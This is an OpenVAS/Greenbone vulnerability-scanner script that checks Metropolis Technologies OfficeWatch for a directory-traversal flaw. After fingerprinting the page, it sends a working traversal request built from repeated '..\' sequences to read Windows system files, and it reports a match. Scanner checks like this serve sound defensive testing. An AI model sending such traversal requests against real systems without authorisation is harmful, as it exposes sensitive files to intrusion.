# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103502");
  script_version("2025-04-15T05:54:49+0000");
  script_name("Metropolis Technologies OfficeWatch Directory Traversal Vulnerability");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2012-06-27 13:52:32 +0200 (Wed, 27 Jun 2012)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("find_service.nasl", "httpver.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_mandatory_keys("Host/runs_windows");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49921");
  script_xref(name:"URL", value:"http://www.metropolis.com/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/519990");

  script_tag(name:"summary", value:"Metropolis Technologies OfficeWatch is prone to a directory-traversal
  vulnerability because it fails to sufficiently sanitize user-supplied input data.");

  script_tag(name:"impact", value:"Exploiting the issue may allow an attacker to obtain sensitive
  information that could aid in further attacks.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

port = http_get_port( default:80 );

res = http_get_cache( port:port, item:"/" );
if( !res || "<title>OfficeWatch" >!< res )
  exit( 0 );

files = traversal_files( "Windows" );

foreach pattern( keys( files ) ) {

  file = files[pattern];
  url = "/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\" + file;

  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 0 );
